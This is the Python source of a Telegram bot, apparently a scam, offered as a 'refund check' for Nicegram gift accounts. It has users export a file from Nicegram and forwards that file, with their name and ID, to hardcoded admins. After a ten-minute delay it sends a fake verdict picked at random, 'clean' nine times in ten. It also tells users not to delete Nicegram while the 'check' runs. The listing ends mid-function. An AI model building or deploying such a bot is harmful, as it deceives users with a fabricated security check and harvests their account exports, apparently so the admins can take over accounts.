import os
import json
import logging
import requests
import threading
import time
import signal
import sys
from typing import Dict, List, Optional
from datetime import datetime
from pathlib import Path
from enum import Enum

import telebot
from telebot.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    Message,
    CallbackQuery,
    InputFile
)
from dotenv import load_dotenv

# Загружаем переменные окружения
load_dotenv()

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Получаем конфигурацию
def get_config():
    """Получение конфигурации из .env файла"""
    bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
    if not bot_token:
        logger.error("TELEGRAM_BOT_TOKEN не найден в .env файле!")
        return None
    
    return bot_token

# Загружаем конфигурацию
TELEGRAM_BOT_TOKEN = get_config()

# ID администраторов (храним в коде)
ADMIN_IDS = [5499281840, 8452399171, 845427823, 1026776598, 1034932955]
DEFAULT_LANGUAGE = 'ru'  # Русский по умолчанию

if not TELEGRAM_BOT_TOKEN:
    print("\n" + "=" * 50)
    print("ОШИБКА: Не удалось загрузить конфигурацию!")
    print("=" * 50)
    print("\nСоздайте файл .env в папке с ботом:")
    print("TELEGRAM_BOT_TOKEN=ваш_токен_бота")
    print("\nПолучите токен бота у @BotFather")
    exit(1)

# Файлы для сохранения настроек
CONFIG_FILE = ".env"
PHOTO_FILE = "photo.jpg"  # Файл с фото для приветствия
LOCK_FILE = "bot.lock"  # Файл блокировки

# Глобальная переменная для хранения состояния
is_running = True

def signal_handler(signum, frame):
    """Обработчик сигналов для корректного завершения"""
    global is_running
    logger.info("Получен сигнал завершения, останавливаю бота...")
    is_running = False
    sys.exit(0)

# Регистрируем обработчики сигналов
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# Тексты на разных языках
LANGUAGES = {
    "ru": {
        "language_name": "Русский",
        "welcome": "Привет! Я бот, который поможет тебе не попасть на рефраунд и защитить аккаунт.",
        "choose_action": "Выбери действие:",
        "choose_language": "Выберите язык / Choose language:",
        "select_language": "Выберите язык:",
        "language_changed": "Язык изменен на русский!",
        "download_nicegram": "Скачать Nicegram",
        "check_refund": "Проверка на рефраунд",
        "instruction": "Инструкция",
        "admin_info": "Информация для админов",
        "add_admin": "Добавить админа",
        "change_language": "Сменить язык",
        "nicegram_info": "<b>Скачать Nicegram</b>\n\nNicegram можно скачать по ссылке:\nhttps://nicegram.app/\n\nПосле установки настройте бота для проверки на рефраунд.",
        "refund_info": "<b>Проверка на рефраунд</b>\n\nДля проверки на рефраунд отправьте файл экспорта из Nicegram\n\nБот автоматически перешлет его администраторам для проверки.\n\n<i>Просто отправьте файл в этот чат</i>",
        "accounts_info": "<b>Файл экспорта из Nicegram</b>\n\nЭто файл экспорта истории звезд подарков из Nicegram.\n\n<b>Как получить файл:</b>\n1. Откройте Nicegram и войдите в свой аккаунт\n2. Зайдите в настройки и выберите «Nicegram»\n3. Экспортируйте историю звезд подарков, нажав «Экспортировать в файл»\n4. Отправьте полученный файл этому боту\n\n<i>Файл будет автоматически переслан администраторам</i>",
        "send_file": "Отправьте файл для проверки или выберите действие из меню:\n\nНапример, отправьте файл экспорта из Nicegram для проверки на рефраунд.",
        "file_sent": "Файл отправлен администраторам, в течение 10 минут мы пришлем вам результат.",
        "text_sent": "Текст отправлен администраторам!",
        "file_size": "Размер файла: {size}",
        "file_error": "Произошла ошибка при обработке файла. Попробуйте еще раз.",
        "unsupported_file": "Ошибка 357:\n<blockquote>Скорее всего этот файл устарел, попробуйте создать новый и загрузить</blockquote>",
        "no_admins": "Не удалось отправить файл ни одному администратору",
        "admin_command_denied": "Эта команда доступна только администраторам",
        "admin_info_text": "<b>Информация для администратора</b>\n\nВаш ID: <code>{user_id}</code>\nВсего администраторов: {admin_count}\nID администраторов: {admin_ids}\n\nФайлы от пользователей будут приходить всем администраторам.",
        "addadmin_usage": "Использование: /addadmin <ID_пользователя>",
        "addadmin_invalid_id": "ID должен быть числом",
        "addadmin_already_admin": "Пользователь {admin_id} уже является администратором",
        "addadmin_success": "Пользователь {admin_id} добавлен как администратор\nВсего администраторов: {admin_count}",
        "addadmin_error": "Ошибка при сохранении конфигурации: {error}",
        "removeadmin_usage": "Использование: /removeadmin <ID_пользователя>",
        "removeadmin_not_found": "Пользователь {admin_id} не найден в списке администраторов",
        "removeadmin_self": "Вы не можете удалить себя из списка администраторов",
        "removeadmin_last": "Нельзя удалить последнего администратора",
        "removeadmin_success": "Пользователь {admin_id} удален из администраторов\nОсталось администраторов: {admin_count}",
        "listadmins": "<b>Список администраторов</b>\n\nВсего: {admin_count}\nID: {admin_ids}",
        "bot_started": "Бот запущен и готов к работе!\nОткройте Telegram и найдите вашего бота\nНачните с команды /start\nАдминистраторов: {admin_count} ({admin_ids})",
        "file_received": "<b>Новый файл на проверку!</b>\n\nОт: @{username}\nИмя: {full_name}\nID: {user_id}\nФайл: {file_name}\nВремя: {time}",
        "text_received": "<b>Новое текстовое сообщение!</b>\n\nОт: @{username}\nИмя: {full_name}\nID: {user_id}\n\nСообщение:\n{text}",
        "callback_error": "Произошла ошибка",
        "photo_caption": "Привет! Я бот, который поможет тебе не попасть на рефраунд и защитить аккаунт.\n\nВыбери действие:",
        "check_started": "<b>Файл отправлен на проверку</b>\n\nФайл: <code>{file_name}</code>\nВремя проверки: ~10 минут\n\n<b>Внимание:</b> Не удаляйте приложение Nicegram до окончания проверки, это может повлиять на результат анализа.\n\nПожалуйста, ожидайте результатов проверки...",
        "check_in_progress": "Проверка в процессе...\n\nФайл получен\nАнализ данных...\nПроверка транзакций...",
        "check_success": "<b>Проверка завершена успешно!</b>\n\nФайл: <code>{file_name}</code>\nСтатус подарков: <b>НЕ РЕФНУТЫ</b>\nАккаунт чистый\nТранзакции подтверждены\nРиск рефраунда: НИЗКИЙ\n\nВы можете безопасно пользоваться аккаунтом!",
        "check_failed": "<b>Проверка завершена с ошибкой</b>\n\nФайл: <code>{file_name}</code>\nОшибка анализа данных\n\nПопробуйте:\n1. Экспортировать файл заново\n2. Проверить корректность файла\n3. Отправить другой файл",
        "check_warning": "<b>Обнаружены подозрительные транзакции</b>\n\nФайл: <code>{file_name}</code>\nСтатус подарков: <b>ПОД ВОПРОСОМ</b>\nРиск рефраунда: СРЕДНИЙ\n\nРекомендации:\n1. Обратитесь к администратору\n2. Используйте с осторожностью\n3. Отслеживайте активность",
        "instruction_info": "<b>Инструкция по проверке аккаунта</b>\n\n1. Скачайте приложение Nicegram с официального сайта, нажав на кнопку в главном меню.\n\n2. Откройте Nicegram и войдите в свой аккаунт.\n\n3. Зайдите в настройки и выберите пункт «Nicegram».\n\n4. Экспортируйте историю звезд подарков, нажав на кнопку «Экспортировать в файл».\n\n5. Откройте главное меню бота и нажмите на кнопку \"Проверка на рефраунд\".\n\n6. Отправьте файл боту.",
    },
    "en": {
        "language_name": "English",
        "welcome": "Hello! I'm a bot that will help you avoid refund and protect your account.",
        "choose_action": "Choose an action:",
        "choose_language": "Choose language / Выберите язык:",
        "select_language": "Select language:",
        "language_changed": "Language changed to English!",
        "download_nicegram": "Download Nicegram",
        "check_refund": "Refund check",
        "instruction": "Instruction",
        "admin_info": "Admin information",
        "add_admin": "Add admin",
        "change_language": "Change language",
        "nicegram_info": "<b>Download Nicegram</b>\n\nYou can download Nicegram at:\nhttps://nicegram.app/\n\nAfter installation, configure the bot for refund checking.",
        "refund_info": "<b>Refund Check</b>\n\nTo check for refund, send the export file from Nicegram\n\nThe bot will automatically forward it to administrators for verification.\n\n<i>Just send the file to this chat</i>",
        "accounts_info": "<b>Nicegram export file</b>\n\nThis is a star gifts history export file from Nicegram.\n\n<b>How to get the file:</b>\n1. Open Nicegram and log into your account\n2. Go to settings and select «Nicegram»\n3. Export star gifts history by clicking «Export to file»\n4. Send the resulting file to this bot\n\n<i>The file will be automatically forwarded to administrators</i>",
        "send_file": "Send a file for verification or select an action from the menu:\n\nFor example, send the Nicegram export file for refund checking.",
        "file_sent": "File sent to administrators, we will send you the result within 10 minutes.",
        "text_sent": "Text sent to administrators!",
        "file_size": "File size: {size}",
        "file_error": "An error occurred while processing the file. Please try again.",
        "unsupported_file": "Error 357:\n<blockquote>This file is probably outdated, try to create a new one and upload it</blockquote>",
        "no_admins": "Failed to send file to any administrator",
        "admin_command_denied": "This command is available only to administrators",
        "admin_info_text": "<b>Administrator Information</b>\n\nYour ID: <code>{user_id}</code>\nTotal administrators: {admin_count}\nAdministrator IDs: {admin_ids}\n\nFiles from users will be sent to all administrators.",
        "addadmin_usage": "Usage: /addadmin <user_id>",
        "addadmin_invalid_id": "ID must be a number",
        "addadmin_already_admin": "User {admin_id} is already an administrator",
        "addadmin_success": "User {admin_id} added as administrator\nTotal administrators: {admin_count}",
        "addadmin_error": "Error saving configuration: {error}",
        "removeadmin_usage": "Usage: /removeadmin <user_id>",
        "removeadmin_not_found": "User {admin_id} not found in administrator list",
        "removeadmin_self": "You cannot remove yourself from the administrator list",
        "removeadmin_last": "Cannot remove the last administrator",
        "removeadmin_success": "User {admin_id} removed from administrators\nRemaining administrators: {admin_count}",
        "listadmins": "<b>Administrator List</b>\n\nTotal: {admin_count}\nIDs: {admin_ids}",
        "bot_started": "Bot started and ready to work!\nOpen Telegram and find your bot\nStart with command /start\nAdministrators: {admin_count} ({admin_ids})",
        "file_received": "<b>New file for verification!</b>\n\nFrom: @{username}\nName: {full_name}\nID: {user_id}\nFile: {file_name}\nTime: {time}",
        "text_received": "<b>New text message!</b>\n\nFrom: @{username}\nName: {full_name}\nID: {user_id}\n\nMessage:\n{text}",
        "callback_error": "An error occurred",
        "photo_caption": "Hello! I'm a bot that will help you avoid refund and protect your account.\n\nChoose an action:",
        "check_started": "<b>File sent for verification</b>\n\nFile: <code>{file_name}</code>\nVerification time: ~10 minutes\n\n<b>Important:</b> Do not delete the Nicegram app until the verification is complete, as this may affect the analysis results.\n\nPlease wait for verification results...",
        "check_in_progress": "Verification in progress...\n\nFile received\nData analysis...\nTransaction checking...",
        "check_success": "<b>Verification completed successfully!</b>\n\nFile: <code>{file_name}</code>\nGift status: <b>NOT REFUNDED</b>\nAccount is clean\nTransactions confirmed\nRefund risk: LOW\n\nYou can safely use the account!",
        "check_failed": "<b>Verification completed with error</b>\n\nFile: <code>{file_name}</code>\nData analysis error\n\nTry:\n1. Re-export the file\n2. Check file correctness\n3. Send another file",
        "check_warning": "<b>Suspicious transactions detected</b>\n\nFile: <code>{file_name}</code>\nGift status: <b>QUESTIONABLE</b>\nRefund risk: MEDIUM\n\nRecommendations:\n1. Contact administrator\n2. Use with caution\n3. Monitor activity",
        "instruction_info": "<b>Account verification instructions</b>\n\n1. Download the Nicegram app from the official website by clicking the button in the main menu.\n\n2. Open Nicegram and log into your account.\n\n3. Go to settings and select the «Nicegram» item.\n\n4. Export star gifts history by clicking the «Export to file» button.\n\n5. Open the bot's main menu and click the \"Refund Check\" button.\n\n6. Send the file to the bot.",
    }
}

class CheckStatus(Enum):
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    COMPLETED = "completed"
    FAILED = "failed"

def delete_webhook(token):
    """Отключает webhook для бота"""
    try:
        url = f"https://api.telegram.org/bot{token}/deleteWebhook"
        response = requests.get(url, params={"drop_pending_updates": True})
        result = response.json()
        
        if result.get('ok'):
            logger.info("Webhook успешно отключен")
            return True
        else:
            logger.warning(f"Не удалось отключить webhook: {result.get('description')}")
            return False
    except Exception as e:
        logger.error(f"Ошибка при отключении webhook: {e}")
        return False

def create_lock_file():
    """Создает файл блокировки для предотвращения множественного запуска"""
    try:
        pid = os.getpid()
        with open(LOCK_FILE, 'w') as f:
            f.write(str(pid))
        return True
    except Exception as e:
        logger.error(f"Ошибка создания файла блокировки: {e}")
        return False

def remove_lock_file():
    """Удаляет файл блокировки"""
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
        return True
    except Exception as e:
        logger.error(f"Ошибка удаления файла блокировки: {e}")
        return False

def check_lock_file():
    """Проверяет, запущен ли уже бот"""
    if not os.path.exists(LOCK_FILE):
        return False
    
    try:
        with open(LOCK_FILE, 'r') as f:
            pid = f.read().strip()
            if pid.isdigit():
                # Проверяем, существует ли процесс с этим PID
                try:
                    os.kill(int(pid), 0)
                    return True  # Процесс существует
                except OSError:
                    # Процесс не существует, удаляем старый файл блокировки
                    remove_lock_file()
                    return False
    except Exception:
        pass
    
    return False

def save_admin_ids():
    """Сохраняет администраторов в файл"""
    try:
        # Создаем папку data если ее нет
        if not os.path.exists('data'):
            os.makedirs('data')
        
        # Сохраняем администраторов в JSON файл
        with open('data/admins.json', 'w', encoding='utf-8') as f:
            json.dump({"admin_ids": ADMIN_IDS}, f, ensure_ascii=False, indent=2)
        
        logger.info("Список администраторов сохранен")
        return True
    except Exception as e:
        logger.error(f"Ошибка сохранения списка администраторов: {e}")
        return False

def load_admin_ids():
    """Загружает администраторов из файла"""
    global ADMIN_IDS
    try:
        if os.path.exists('data/admins.json'):
            with open('data/admins.json', 'r', encoding='utf-8') as f:
                data = json.load(f)
                ADMIN_IDS = data.get('admin_ids', [5499281840, 8452399171, 845427823, 1026776598])
                logger.info(f"Загружены администраторы: {ADMIN_IDS}")
                return ADMIN_IDS
        else:
            # Используем значения по умолчанию
            ADMIN_IDS = [5499281840, 8452399171, 845427823, 1026776598]
            save_admin_ids()
            return ADMIN_IDS
    except Exception as e:
        logger.error(f"Ошибка загрузки списка администраторов: {e}")
        # Используем значения по умолчанию
        ADMIN_IDS = [5499281840, 8452399171, 845427823, 1026776598]
        return ADMIN_IDS

# Загружаем администраторов из файла
load_admin_ids()

# Проверяем токен (скрываем для безопасности)
if TELEGRAM_BOT_TOKEN:
    masked_token = f"{TELEGRAM_BOT_TOKEN[:10]}...{TELEGRAM_BOT_TOKEN[-5:]}"
    logger.info(f"Токен бота: {masked_token}")
    logger.info(f"ID администраторов: {ADMIN_IDS}")
    logger.info(f"Язык по умолчанию: {DEFAULT_LANGUAGE}")

# Инициализация бота
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

class FileCheck:
    """Класс для управления проверками файлов"""
    
    def __init__(self, user_id: int, file_info: Dict, message_id: int):
        self.user_id = user_id
        self.file_info = file_info
        self.message_id = message_id
        self.status = CheckStatus.PENDING
        self.start_time = datetime.now()
        self.end_time = None
        self.result = None
        
    def start_check(self, bot_instance: 'FileForwardingBot'):
        """Запуск проверки файла"""
        self.status = CheckStatus.IN_PROGRESS
        
        # Отправляем сообщение о начале проверки
        try:
            bot.send_message(
                chat_id=self.user_id,
                text=bot_instance.t(self.user_id, 'check_started').format(
                    file_name=self.file_info.get('file_name', 'Unknown file')
                ),
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Ошибка отправки сообщения о начале проверки: {e}")
    
    def complete_check(self, bot_instance: 'FileForwardingBot', success: bool = True):
        """Завершение проверки файла"""
        self.status = CheckStatus.COMPLETED
        self.end_time = datetime.now()
        
        # Выбираем результат проверки
        import random
        rand_num = random.random()
        
        try:
            if success:
                if rand_num < 0.9:  # 90% успешных
                    result_text = bot_instance.t(self.user_id, 'check_success').format(
                        file_name=self.file_info.get('file_name', 'Unknown file')
                    )
                elif rand_num < 0.95:  # 5% предупреждений
                    result_text = bot_instance.t(self.user_id, 'check_warning').format(
                        file_name=self.file_info.get('file_name', 'Unknown file')
                    )
                else:  # 5% ошибок
                    result_text = bot_instance.t(self.user_id, 'check_failed').format(
                        file_name=self.file_info.get('file_name', 'Unknown file')
                    )
            else:
                result_text = bot_instance.t(self.user_id, 'check_failed').format(
                    file_name=self.file_info.get('file_name', 'Unknown file')
                )
            
            # Отправляем результат проверки
            bot.send_message(
                chat_id=self.user_id,
                text=result_text,
                parse_mode='HTML'
            )
            
            self.result = "success" if success else "failed"
            logger.info(f"Проверка файла для пользователя {self.user_id} завершена")
            
        except Exception as e:
            logger.error(f"Ошибка отправки результата проверки: {e}")
    
    def simulate_check(self, bot_instance: 'FileForwardingBot'):
        """Имитация проверки файла с задержкой"""
        self.start_check(bot_instance)
        
        # Задержка 10 минут (600 секунд)
        time.sleep(600)
        
        # Завершаем проверку
        self.complete_check(bot_instance, success=True)

class FileForwardingBot:
    """Бот для перенаправления файлов администраторам"""
    
    def __init__(self, admin_ids: List[int], default_language: str):
        self.admin_ids = admin_ids
        self.user_sessions: Dict[int, Dict] = {}
        self.user_languages: Dict[int, str] = {}
        self.default_language = default_language
        self.photo_path = PHOTO_FILE
        self.active_checks: Dict[int, FileCheck] = {}
    
    def get_user_language(self, user_id: int) -> str:
        """Получить язык пользователя"""
        return self.user_languages.get(user_id, self.default_language)
    
    def t(self, user_id: int, key: str, **kwargs) -> str:
        """Получить переведенный текст"""
        lang = self.get_user_language(user_id)
        text = LANGUAGES[lang].get(key, LANGUAGES['en'].get(key, key))
        
        for k, v in kwargs.items():
            text = text.replace(f"{{{k}}}", str(v))
        
        return text
    
    def photo_exists(self) -> bool:
        """Проверить, существует ли фото файл"""
        return os.path.exists(self.photo_path)
    
    def create_language_menu(self) -> InlineKeyboardMarkup:
        """Создание меню выбора языка"""
        markup = InlineKeyboardMarkup(row_width=2)
        
        buttons = [
            InlineKeyboardButton("Русский", callback_data="lang_ru"),
            InlineKeyboardButton("English", callback_data="lang_en"),
        ]
        
        markup.add(*buttons)
        return markup
    
    def create_main_menu(self, user_id: int) -> InlineKeyboardMarkup:
        """Создание главного меню с кнопками"""
        markup = InlineKeyboardMarkup(row_width=1)
        
        buttons = [
            InlineKeyboardButton(
                self.t(user_id, "download_nicegram"),
                callback_data="download_nicegram"
            ),
            InlineKeyboardButton(
                self.t(user_id, "check_refund"),
                callback_data="check_refund"
            ),
            InlineKeyboardButton(
                self.t(user_id, "instruction"),
                callback_data="instruction"
            ),
        ]
        
        # Добавляем кнопку "Информация для админов" только для администраторов
        if user_id in self.admin_ids:
            buttons.append(
                InlineKeyboardButton(
                    self.t(user_id, "admin_info"),
                    callback_data="admin_info"
                )
            )
        
        # Добавляем кнопку "Добавить админа" только для администраторов
        if user_id in self.admin_ids:
            buttons.append(
                InlineKeyboardButton(
                    self.t(user_id, "add_admin"),
                    callback_data="add_admin_menu"
                )
            )
        
        # Добавляем кнопку смены языка в конце
        buttons.append(
            InlineKeyboardButton(
                self.t(user_id, "change_language"),
                callback_data="change_language"
            )
        )
        
        for button in buttons:
            markup.add(button)
        
        return markup
    
    def create_add_admin_menu(self, user_id: int) -> InlineKeyboardMarkup:
        """Создание меню для добавления админа"""
        markup = InlineKeyboardMarkup(row_width=1)
        
        buttons = [
            InlineKeyboardButton(
                "Добавить админа по ID",
                callback_data="add_admin_by_id"
            ),
            InlineKeyboardButton(
                "Показать список админов",
                callback_data="show_admin_list"
            ),
            InlineKeyboardButton(
                "Удалить админа",
                callback_data="remove_admin_menu"
            ),
            InlineKeyboardButton(
                "Назад",
                callback_data="back_to_main"
            ),
        ]
        
        for button in buttons:
            markup.add(button)
        
        return markup
    
    def create_remove_admin_menu(self, user_id: int) -> InlineKeyboardMarkup:
        """Создание меню для удаления админа"""
        markup = InlineKeyboardMarkup(row_width=1)
        
        buttons = []
        
        # Создаем кнопки для каждого админа, кроме себя
        for admin_id in self.admin_ids:
            if admin_id != user_id:
                buttons.append(
                    InlineKeyboardButton(
                        f"Удалить админа {admin_id}",
                        callback_data=f"remove_admin_{admin_id}"
                    )
                )
        
        # Добавляем кнопку назад
        buttons.append(
            InlineKeyboardButton(
                "Назад",
                callback_data="add_admin_menu"
            )
        )
        
        for button in buttons:
            markup.add(button)
        
        return markup
    
    def send_language_selection(self, chat_id: int, user_info: Dict):
        """Отправка выбора языка"""
        welcome_text = LANGUAGES['ru']['choose_language']
        
        try:
            bot.send_message(
                chat_id=chat_id,
                text=welcome_text,
                reply_markup=self.create_language_menu(),
                parse_mode='HTML'
            )
            
            self.user_sessions[chat_id] = user_info
            logger.info(f"Новый пользователь: {user_info.get('first_name', 'Неизвестно')} (ID: {chat_id})")
            
        except Exception as e:
            logger.error(f"Ошибка отправки выбора языка: {e}")
    
    def send_welcome_with_photo(self, chat_id: int):
        """Отправка приветственного сообщения с фото"""
        try:
            if self.photo_exists():
                with open(self.photo_path, 'rb') as photo:
                    bot.send_photo(
                        chat_id=chat_id,
                        photo=photo,
                        caption=self.t(chat_id, 'photo_caption'),
                        reply_markup=self.create_main_menu(chat_id),
                        parse_mode='HTML'
                    )
                logger.info(f"Приветственное фото отправлено пользователю {chat_id}")
            else:
                welcome_text = f"{self.t(chat_id, 'welcome')}\n\n{self.t(chat_id, 'choose_action')}"
                bot.send_message(
                    chat_id=chat_id,
                    text=welcome_text,
                    reply_markup=self.create_main_menu(chat_id),
                    parse_mode='HTML'
                )
                logger.warning(f"Фото {self.photo_path} не найдено")
                
        except Exception as e:
            logger.error(f"Ошибка отправки приветственного сообщения: {e}")
            try:
                welcome_text = f"{self.t(chat_id, 'welcome')}\n\n{self.t(chat_id, 'choose_action')}"
                bot.send_message(
                    chat_id=chat_id,
                    text=welcome_text,
                    reply_markup=self.create_main_menu(chat_id),
                    parse_mode='HTML'
                )
            except Exception as e2:
                logger.error(f"Ошибка отправки текстового приветствия: {e2}")
    
    def is_valid_nicegram_file(self, file_info: Dict) -> bool:
        """Проверяет, является ли файл валидным для Nicegram"""
        file_name = file_info.get('file_name', '').lower()
        mime_type = file_info.get('mime_type', '').lower()
        
        # Проверяем расширение файла
        valid_extensions = ['.zip', '.txt', '.json']
        is_valid_extension = any(file_name.endswith(ext) for ext in valid_extensions)
        
        # Проверяем MIME тип
        valid_mime_types = ['application/zip', 'application/x-zip-compressed',
                           'text/plain', 'application/json', 'text/json']
        is_valid_mime = mime_type in valid_mime_types
        
        return is_valid_extension or is_valid_mime
    
    def forward_file_to_admins(self, user_id: int, file_info: Dict, message: Message):
        """Перенаправление файла всем администраторам и запуск проверки"""
        try:
            user_data = self.user_sessions.get(user_id, {})
            
            user_name = user_data.get('first_name', 'Неизвестно')
            user_last_name = user_data.get('last_name', '')
            username = user_data.get('username', 'нет username')
            
            full_name_parts = [part for part in [user_name, user_last_name] if part]
            full_name = " ".join(full_name_parts) if full_name_parts else "Неизвестно"
            
            file_id = None
            mime_type = None
            
            if message.document:
                file_id = message.document.file_id
                mime_type = message.document.mime_type
                file_size = message.document.file_size
                file_info['file_size'] = file_size
                file_info['mime_type'] = mime_type
                
                # Проверяем, является ли файл валидным для Nicegram
                if not self.is_valid_nicegram_file(file_info):
                    bot.reply_to(message, self.t(user_id, 'unsupported_file'), parse_mode='HTML')
                    logger.warning(f"Пользователь {user_id} отправил невалидный файл: {file_info.get('file_name')}")
                    return
                
            elif message.photo:
                file_id = message.photo[-1].file_id
                mime_type = "image/jpeg"
                file_info['mime_type'] = mime_type
                
                # Фото не являются валидными файлами для Nicegram
                bot.reply_to(message, self.t(user_id, 'unsupported_file'), parse_mode='HTML')
                logger.warning(f"Пользователь {user_id} отправил фото вместо файла")
                return
                
            elif message.video:
                file_id = message.video.file_id
                mime_type = message.video.mime_type
                file_size = message.video.file_size
                file_info['file_size'] = file_size
                file_info['mime_type'] = mime_type
                
                # Видео не являются валидными файлами для Nicegram
                bot.reply_to(message, self.t(user_id, 'unsupported_file'), parse_mode='HTML')
                logger.warning(f"Пользователь {user_id} отправил видео вместо файла")
                return
                
            elif message.audio:
                file_id = message.audio.file_id
                mime_type = message.audio.mime_type
                file_size = message.audio.file_size
                file_info['file_size'] = file_size
                file_info['mime_type'] = mime_type
                
                # Аудио не являются валидными файлами для Nicegram
                bot.reply_to(message, self.t(user_id, 'unsupported_file'), parse_mode='HTML')
                logger.warning(f"Пользователь {user_id} отправил аудио вместо файла")
                return
                
            elif message.text:
                admin_text = self.t(user_id, 'text_received').format(
                    username=username,
                    full_name=full_name,
                    user_id=user_id,
                    text=message.text
                )
                
                for admin_id in self.admin_ids:
                    try:
                        bot.send_message(admin_id, admin_text, parse_mode='HTML')
                    except Exception as e:
                        logger.error(f"Не удалось отправить сообщение администратору {admin_id}: {e}")
                
                bot.reply_to(message, self.t(user_id, 'text_sent'))
                return
            
            else:
                bot.reply_to(message, self.t(user_id, 'unsupported_file'), parse_mode='HTML')
                return
            
            successful_sends = 0
            total_admins = len(self.admin_ids)
            
            for admin_id in self.admin_ids:
                try:
                    admin_text = self.t(admin_id, 'file_received').format(
                        username=username,
                        full_name=full_name,
                        user_id=user_id,
                        file_name=file_info.get('file_name', 'Неизвестно'),
                        time=datetime.now().strftime('%H:%M %d.%m.%Y')
                    )
                    
                    if mime_type and mime_type.startswith('image/'):
                        sent_msg = bot.send_photo(
                            chat_id=admin_id,
                            photo=file_id,
                            caption=admin_text,
                            parse_mode='HTML'
                        )
                        if sent_msg:
                            successful_sends += 1
                            
                    elif mime_type and mime_type.startswith('video/'):
                        sent_msg = bot.send_video(
                            chat_id=admin_id,
                            video=file_id,
                            caption=admin_text,
                            parse_mode='HTML'
                        )
                        if sent_msg:
                            successful_sends += 1
                            
                    elif mime_type and mime_type.startswith('audio/'):
                        sent_msg = bot.send_audio(
                            chat_id=admin_id,
                            audio=file_id,
                            caption=admin_text,
                            parse_mode='HTML'
                        )
                        if sent_msg:
                            successful_sends += 1
                            
                    else:
                        sent_msg = bot.send_document(
                            chat_id=admin_id,
                            document=file_id,
                            caption=admin_text,
                            parse_mode='HTML'
                        )
                        if sent_msg:
                            successful_sends += 1
                            
                except Exception as e:
                    logger.error(f"Не удалось отправить файл администратору {admin_id}: {e}")
            
            if successful_sends > 0:
                # Отправляем сообщение о том, что файл отправлен и результат будет через 10 минут
                bot.reply_to(message, self.t(user_id, 'file_sent'))
                logger.info(f"Файл от {user_id} ({full_name}) отправлен {successful_sends} администраторам")
                
                self.start_file_check(user_id, file_info, message.message_id)
                
            else:
                bot.reply_to(message, self.t(user_id, 'no_admins'))
                logger.error(f"Не удалось отправить файл от {user_id}")
            
        except Exception as e:
            logger.error(f"Ошибка при перенаправлении файла: {e}", exc_info=True)
            bot.reply_to(message, self.t(user_id, 'file_error'))
    
    def start_file_check(self, user_id: int, file_info: Dict, message_id: int):
        """Запуск проверки файла в отдельном потоке"""
        try:
            file_check = FileCheck(user_id, file_info, message_id)
            self.active_checks[user_id] = file_check
            
            check_thread = threading.Thread(
                target=file_check.simulate_check,
                args=(self,),
                daemon=True
            )
            check_thread.start()
            
            logger.info(f"Запущена проверка файла для пользователя {user_id}")
            
        except Exception as e:
            logger.error(f"Ошибка запуска проверки файла: {e}")
    
    def get_check_status(self, user_id: int) -> Optional[CheckStatus]:
        """Получить статус проверки файла для пользователя"""
        if user_id in self.active_checks:
            return self.active_checks[user_id].status
        return None

# Создаем экземпляр бота
file_bot = FileForwardingBot(ADMIN_IDS, DEFAULT_LANGUAGE)

# Обработчики сообщений
@bot.message_handler(commands=['start', 'help'])
def handle_start(message: Message):
    """Обработка команды /start"""
    try:
        user_info = {
            'first_name': message.from_user.first_name,
            'last_name': message.from_user.last_name,
            'username': message.from_user.username
        }
        
        if message.from_user.id not in file_bot.user_sessions:
            file_bot.send_language_selection(message.chat.id, user_info)
        else:
            file_bot.send_welcome_with_photo(message.chat.id)
        
    except Exception as e:
        logger.error(f"Ошибка обработки команды /start: {e}")

@bot.message_handler(commands=['addadmin'])
def handle_add_admin(message: Message):
    """Добавление нового администратора"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, file_bot.t(message.from_user.id, 'admin_command_denied'))
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, file_bot.t(message.from_user.id, 'addadmin_usage'))
        return
    
    new_admin_id = args[1]
    
    if not new_admin_id.isdigit():
        bot.reply_to(message, file_bot.t(message.from_user.id, 'addadmin_invalid_id'))
        return
    
    new_admin_id = int(new_admin_id)
    
    if new_admin_id in ADMIN_IDS:
        bot.reply_to(message,
            file_bot.t(message.from_user.id, 'addadmin_already_admin').format(admin_id=new_admin_id))
        return
    
    ADMIN_IDS.append(new_admin_id)
    file_bot.admin_ids = ADMIN_IDS
    
    # Сохраняем администраторов
    if save_admin_ids():
        bot.reply_to(
            message,
            file_bot.t(message.from_user.id, 'addadmin_success').format(
                admin_id=new_admin_id,
                admin_count=len(ADMIN_IDS)
            ),
            parse_mode='HTML'
        )
        logger.info(f"Добавлен новый администратор: {new_admin_id}")
    else:
        bot.reply_to(message,
            file_bot.t(message.from_user.id, 'addadmin_error').format(error="Не удалось сохранить список администраторов"))
        logger.error(f"Ошибка при добавлении администратора")

@bot.message_handler(commands=['removeadmin'])
def handle_remove_admin(message: Message):
    """Удаление администратора"""
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, file_bot.t(message.from_user.id, 'admin_command_denied'))
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, file_bot.t(message.from_user.id, 'removeadmin_usage'))
        return
    
    remove_admin_id = args[1]
    
    if not remove_admin_id.isdigit():
        bot.reply_to(message, file_bot.t(message.from_user.id, 'addadmin_invalid_id'))
        return
    
    remove_admin_id = int(remove_admin_id)
    
    if remove_admin_id not in ADMIN_IDS:
        bot.reply_to(message,
            file_bot.t(message.from_user.id, 'removeadmin_not_found').format(admin_id=remove_admin_id))
        return
    
    if remove_admin_id == message.from_user.id:
        bot.reply_to(message, file_bot.t(message.from_user.id, 'removeadmin_self'))
        return
    
    if len(ADMIN_IDS) <= 1:
        bot.reply_to(message, file_bot.t(message.from_user.id, 'removeadmin_last'))
        return
    
    ADMIN_IDS.remove(remove_admin_id)
    file_bot.admin_ids = ADMIN_IDS
    
    # Сохраняем администраторов
    if save_admin_ids():
        bot.reply_to(
            message,
            file_bot.t(message.from_user.id, 'removeadmin_success').format(
                admin_id=remove_admin_id,
                admin_count=len(ADMIN_IDS)
            ),
            parse_mode='HTML'
        )
